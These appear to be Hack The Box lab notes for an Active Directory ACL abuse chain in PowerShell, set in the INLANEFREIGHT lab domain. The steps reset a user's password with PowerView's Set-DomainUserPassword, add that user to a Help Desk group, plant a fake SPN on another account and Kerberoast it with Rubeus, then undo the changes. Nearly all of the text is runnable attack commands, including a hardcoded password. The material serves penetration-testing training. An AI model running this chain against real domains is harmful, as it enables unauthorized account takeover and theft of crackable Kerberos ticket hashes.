## Abusing ACLs
#### Creating a PSCredential Object

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force 
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
#### Creating a SecureString Object

```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
#### Changing the User's Password

```powershell
PS C:\htb> cd C:\Tools\ 
PS C:\htb> Import-Module .\PowerView.ps1 
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials 
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen' 
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```
#### Creating a SecureString Object using damundsen

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force 
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```
#### Adding damundsen to the Help Desk Level 1 Group

```powershell
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
#### Confirming damundsen was Added to the Group

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
#### Creating a Fake SPN

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
#### Kerberoasting with Rubeus

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```
## Cleanup
#### Removing the Fake SPN from adunn's Account

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
#### Removing damundsen from the Help Desk Level 1 Group

```powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
#### Confirming damundsen was Removed from the Group

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
